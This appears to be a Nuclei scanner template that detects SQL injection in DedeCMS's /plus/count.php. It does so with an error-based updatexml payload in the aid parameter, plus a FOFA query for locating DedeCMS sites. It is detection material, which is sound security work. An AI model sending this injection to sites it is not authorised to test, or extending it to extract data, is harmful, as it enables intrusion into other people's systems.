id: dedecms-count-sqli

info:
  name: dedecms count - sqli 
  author: Str1am
  severity: high
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="DedeCMS"
  tags: dedecms,sqli

http:
  - raw:
      - |
        GET /plus/count.php?view=yes&aid=1+and+updatexml(1,(hex(md5(123))),1)+and+1=1--+- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "202cb962ac59075b964b07152d234b70"
 


